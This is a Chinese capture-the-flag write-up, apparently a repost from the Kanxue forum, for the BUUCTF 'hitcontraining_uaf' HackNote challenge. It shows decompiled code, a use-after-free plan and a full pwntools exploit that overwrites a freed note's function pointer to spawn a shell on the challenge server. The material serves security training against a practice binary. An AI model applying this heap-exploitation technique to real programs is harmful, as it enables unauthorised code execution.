# Buuctf刷题记录-hitcontraining_uaf

> 原文: https://www.ctfiot.com/285744.html
> ID: 285744

1.看保护

2.看源码

int__cdecl __noreturnmain(intargc,constchar**argv,constchar**envp){intv3;// eaxcharbuf[4];// [esp+0h] [ebp-Ch] BYREFint*p_argc;// [esp+4h] [ebp-8h] p_argc = &argc;setvbuf(stdout,0,2,0);setvbuf(stdin,0,2,0);while(1) {while(1) {menu();read(0, buf,4u); v3 =atoi(buf);if( v3 !=2)break;del_note(); }if( v3 >2) {if( v3 ==3) {print_note(); }else {if( v3 ==4)exit(0);LABEL_13:puts("Invalid choice"); } }else {if( v3 !=1)gotoLABEL_13;add_note(); } }}

intmenu(){puts("----------------------");puts(" HackNote ");puts("----------------------");puts(" 1. Add note ");puts(" 2. Delete note ");puts(" 3. Print note ");puts(" 4. Exit ");puts("----------------------");returnprintf("Your choice :");}

intadd_note(){intresult;// eaxintv1;// esicharbuf[8];// [esp+0h] [ebp-18h] BYREFsize_tsize;// [esp+8h] [ebp-10h]inti;// [esp+Ch] [ebp-Ch] result = count;if( count >5)returnputs("Full");for( i =0; i <=4; ++i ) { result = *((_DWORD *)¬elist + i);if( !result ) { *((_DWORD *)¬elist + i) =malloc(8u);if( !*((_DWORD *)¬elist + i) ) {puts("Alloca Error");exit(-1); } **((_DWORD **)¬elist + i) = print_note_content;printf("Note size :");read(0, buf,8u); size =atoi(buf); v1 = *((_DWORD *)¬elist + i); *(_DWORD *)(v1 +4) =malloc(size);if( !*(_DWORD *)(*((_DWORD *)¬elist + i) +4) ) {puts("Alloca Error");exit(-1); }printf("Content :");read(0, *(void**)(*((_DWORD *)¬elist + i) +4), size);puts("Success !");return++count; } }returnresult;}

intdel_note(){intresult;// eaxcharbuf[4];// [esp+8h] [ebp-10h] BYREFintv2;// [esp+Ch] [ebp-Ch]printf("Index :");read(0, buf,4u); v2 =atoi(buf);if( v2 <0|| v2 >= count ) {puts("Out of bound!"); _exit(0); } result = *((_DWORD *)¬elist + v2);if( result ) {free(*(void**)(*((_DWORD *)¬elist + v2) +4));free(*((void**)¬elist + v2));returnputs("Success"); }returnresult;}

intprint_note(){intresult;// eaxcharbuf[4];// [esp+8h] [ebp-10h] BYREFintv2;// [esp+Ch] [ebp-Ch]printf("Index :");read(0, buf,4u); v2 =atoi(buf);if( v2 <0|| v2 >= count ) {puts("Out of bound!"); _exit(0); } result = *((_DWORD *)¬elist + v2);if( result )return(**((int(__cdecl ***)(_DWORD))¬elist + v2))(*((_DWORD *)¬elist + v2));returnresult;}

intmagic(){returnsystem("/bin/sh");}

3.利用思路

add(0x8,b'aaa')add(0x8,b'aaa')add(0x18,b'aaa')

delete(1)delete(2)

payload = p32(magic)add(0x8,payload)print(1)

4.EXP

frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./hacknote')#gdb.attach(io,"b *0x08048A75")elf = ELF("./hacknote")io=remote("node5.buuoj.cn",25034)defadd(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Note size :") io.send(str(size).encode()) io.recvuntil(b"Content :") io.send(payload)defdelete(index): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode())defprint(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())magic = elf.symbols["magic"]add(0x8,b'aaa')add(0x8,b'aaa')add(0x18,b'aaa')delete(1)delete(2)payload = p32(magic)add(0x8,payload)print(1)io.interactive()

看雪ID：G0t1T

https://bbs.kanxue.com/user-home-1002337.htm

*本文为看雪论坛优秀文章，由G0t1T原创，转载请注明来自看雪社区

# 往期推荐

从ANGR-CTF项目入手ANGR和符号执行技术

AI时代-逆向工作者该如何用好这一利器

EXIF解析缓冲区溢出漏洞分析与利用

从C到Pwn：栈溢出漏洞利用实战入门

Android-ARM64的VMP分析和还原

球分享

球点赞

球在看

点击阅读原文查看更多


```
int__cdecl __noreturnmain(intargc,constchar**argv,constchar**envp){intv3;// eaxcharbuf[4];// [esp+0h] [ebp-Ch] BYREFint*p_argc;// [esp+4h] [ebp-8h] p_argc = &argc;setvbuf(stdout,0,2,0);setvbuf(stdin,0,2,0);while(1) {while(1) {menu();read(0, buf,4u); v3 =atoi(buf);if( v3 !=2)break;del_note(); }if( v3 >2) {if( v3 ==3) {print_note(); }else {if( v3 ==4)exit(0);LABEL_13:puts("Invalid choice"); } }else {if( v3 !=1)gotoLABEL_13;add_note(); } }}
```



```
intmenu(){puts("----------------------");puts(" HackNote ");puts("----------------------");puts(" 1. Add note ");puts(" 2. Delete note ");puts(" 3. Print note ");puts(" 4. Exit ");puts("----------------------");returnprintf("Your choice :");}
```



```
intadd_note(){intresult;// eaxintv1;// esicharbuf[8];// [esp+0h] [ebp-18h] BYREFsize_tsize;// [esp+8h] [ebp-10h]inti;// [esp+Ch] [ebp-Ch] result = count;if( count >5)returnputs("Full");for( i =0; i <=4; ++i ) { result = *((_DWORD *)¬elist + i);if( !result ) { *((_DWORD *)¬elist + i) =malloc(8u);if( !*((_DWORD *)¬elist + i) ) {puts("Alloca Error");exit(-1); } **((_DWORD **)¬elist + i) = print_note_content;printf("Note size :");read(0, buf,8u); size =atoi(buf); v1 = *((_DWORD *)¬elist + i); *(_DWORD *)(v1 +4) =malloc(size);if( !*(_DWORD *)(*((_DWORD *)¬elist + i) +4) ) {puts("Alloca Error");exit(-1); }printf("Content :");read(0, *(void**)(*((_DWORD *)¬elist + i) +4), size);puts("Success !");return++count; } }returnresult;}
```



```
intdel_note(){intresult;// eaxcharbuf[4];// [esp+8h] [ebp-10h] BYREFintv2;// [esp+Ch] [ebp-Ch]printf("Index :");read(0, buf,4u); v2 =atoi(buf);if( v2 <0|| v2 >= count ) {puts("Out of bound!"); _exit(0); } result = *((_DWORD *)¬elist + v2);if( result ) {free(*(void**)(*((_DWORD *)¬elist + v2) +4));free(*((void**)¬elist + v2));returnputs("Success"); }returnresult;}
```



```
intprint_note(){intresult;// eaxcharbuf[4];// [esp+8h] [ebp-10h] BYREFintv2;// [esp+Ch] [ebp-Ch]printf("Index :");read(0, buf,4u); v2 =atoi(buf);if( v2 <0|| v2 >= count ) {puts("Out of bound!"); _exit(0); } result = *((_DWORD *)¬elist + v2);if( result )return(**((int(__cdecl ***)(_DWORD))¬elist + v2))(*((_DWORD *)¬elist + v2));returnresult;}
```



```
intmagic(){returnsystem("/bin/sh");}
```



```
add(0x8,b'aaa')add(0x8,b'aaa')add(0x18,b'aaa')
```



```
delete(1)delete(2)
```



```
payload = p32(magic)add(0x8,payload)print(1)
```



```
frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./hacknote')#gdb.attach(io,"b *0x08048A75")elf = ELF("./hacknote")io=remote("node5.buuoj.cn",25034)defadd(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Note size :") io.send(str(size).encode()) io.recvuntil(b"Content :") io.send(payload)defdelete(index): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode())defprint(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())magic = elf.symbols["magic"]add(0x8,b'aaa')add(0x8,b'aaa')add(0x18,b'aaa')delete(1)delete(2)payload = p32(magic)add(0x8,payload)print(1)io.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765242030-wxsync-2025-12-55e752adfa0d5c84c3ea49d631b9b604.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765242032-wxsync-2025-12-3be0e0e94da268ea2fb9276fe1f93574.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765242033-wxsync-2025-12-55e752adfa0d5c84c3ea49d631b9b604.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765242035-wxsync-2025-12-c21ba83fe19263897793235d66955635.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765242037-wxsync-2025-12-55e752adfa0d5c84c3ea49d631b9b604.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765242038-wxsync-2025-12-13b13a791a26540f3b34d9e2a2db1814.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765242040-wxsync-2025-12-55e752adfa0d5c84c3ea49d631b9b604.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765242042-wxsync-2025-12-ab7d699aa4a3772df1ce40e5e13a778a.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765242045-wxsync-2025-12-71612baea187590d75a96ee2368782fc.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765242046-wxsync-2025-12-d2ca368f75092f5eee67f5eec75b95e9.gif)